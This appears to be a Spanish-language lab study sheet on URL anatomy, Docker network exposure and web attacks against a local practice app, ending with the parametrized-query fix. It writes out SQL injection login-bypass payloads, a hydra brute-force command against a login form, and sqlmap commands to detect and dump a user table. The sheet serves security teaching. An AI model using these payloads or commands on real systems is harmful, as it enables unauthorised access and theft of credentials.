Anatomía de una URL

http://app.midominio.com:8888/alumnos/42?activo=true \__/ \_______________/ \__/ \____________/ \_________/ esquema dominio+sub puerto path query
Dominio

midominio.com — lo que se registra y se paga; identifica a la organización.

Subdominio

app. — un espacio con nombre dentro del mismo dominio (api., admin.). No hace falta registrar nada nuevo, es una entrada de DNS más.

Qué resuelve DNS

DNS resuelve dominio (+ subdominio) a una IP. A partir de ahí entra en juego el puerto y quién escucha en él.

Regex de ruteo — cómo las apps capturan la URL

Flask / Werkzeug @app.route("/alumnos/<int:id>")

Se compila internamente a una regex aproximada: ^/alumnos/(?P<id>[0-9]+)$. El grupo capturado llega como parámetro id a la función.

nginx location ~ ^/api/(\d+)$ { ... }

Decide a qué upstream reenviar la petición según el path, antes de que llegue a la app.

Por qué importa hoy

El ruteo hace bien su trabajo con POST /login aunque el body traiga usuario=admin' -- — la petición llega a la función correcta. La inyección ocurre después, dentro de esa función, no en el ruteo.

La red: qué se ve desde dónde

Superficie externa (host)

Lo que docker-compose.yml publica con ports:. En este stack: 80, 8080, 8888.

Superficie interna (red Docker)

3306 (MySQL) cerrado desde localhost, abierto al escanear la IP interna del contenedor. Visible solo entre contenedores de la misma red.

Por qué importa

"Cerrado desde afuera" no es "seguro" — es seguro desde ese punto de vista. Un contenedor comprometido en la misma red ve la superficie interna completa.

host.docker.internal

El camino inverso: nombre especial que, resuelto desde dentro de un contenedor, apunta a la máquina host (no a otro contenedor). Solo tiene sentido resuelto desde adentro — no funciona escrito en el navegador del host.

nmap — conceptos (no ejecutar en Killercoda)

Port scan básico nmap -p 80,8080,8888,3306 localhost

Un puerto es abierto (algo escucha), cerrado (responde, nadie escucha) o filtrado (sin respuesta — firewall).

-sV: fingerprinting de servicio nmap -sV -p 80,8080,8888 localhost

Intenta identificar el software real detrás del puerto (nginx, Werkzeug, versión) — no solo si está abierto.

Fingerprinting de servidores

Identificar software, sistema operativo, servicios y configuración de un servidor remoto analizando cómo responde a distintas peticiones de red — sin acceso directo. -sV compara la respuesta contra una base de firmas conocidas.

Escaneo desde la red interna nmap -p 3306 <ip-interna-contenedor>

Mismo comando, misma herramienta — cambia solo el punto de vista, y con eso, el resultado.

hydra — conceptos (no ejecutar en Killercoda)

Fuerza bruta contra un form hydra -l admin -P wordlist.txt localhost http-post-form "/login:usuario=^USER^&password=^PASS^:F=incorrecta"

http-post-form le dice a hydra qué campos llenar y qué texto de respuesta marca un intento fallido (F=).

Por qué funciona

No hay límite de intentos ni bloqueo temporal. La ausencia de esa defensa — no la herramienta — es la vulnerabilidad real.

Resultado esperado
[80][http-post-form] host: localhost login: admin password: admin123

SQL: vulnerable vs. parametrizada

Vulnerable (concatenación / f-string)Parametrizada
f"SELECT * FROM usuarios WHERE usuario='{u}' AND password='{p}'" "SELECT * FROM usuarios WHERE usuario=%s AND password=%s", (u, p)
El input se pega directo en el SQL — puede cambiar la estructura de la consulta. El motor recibe consulta y valores por separado — el input siempre es dato, nunca código.

El bypass manual — payloads

Con el usuario conocido usuario=admin' --

-- comenta el resto de la línea SQL. La verificación de password nunca ocurre.

Sin conocer el usuario usuario=' OR '1'='1' --

'1'='1' siempre es verdadero — la condición completa del WHERE se vuelve verdadera.

Cómo distinguir éxito
Payload de bypass → 302 (login exitoso) Password inventada → 200 (login rechazado, control)

sqlmap — conceptos (no ejecutar en Killercoda)

Detectar el parámetro inyectable sqlmap -u "http://localhost/login" --data "usuario=x&password=x" -p usuario --batch
Volcar una tabla sqlmap ... --dump -D alumnos -T usuarios
Nota de timing

Si detecta por time-based blind, cada carácter implica peticiones con SLEEP — el --dump completo puede tardar 3-4 minutos. Es esperable, no está colgado.

El fix

Una línea, no un rediseño

Reemplazar la f-string/concatenación por la consulta parametrizada de la tabla de arriba. Nada más del código cambia.
